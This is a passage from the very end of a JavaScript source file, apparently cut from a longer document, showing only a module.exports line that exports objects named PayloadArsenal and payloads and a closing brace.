    module.exports = { PayloadArsenal, payloads };
}
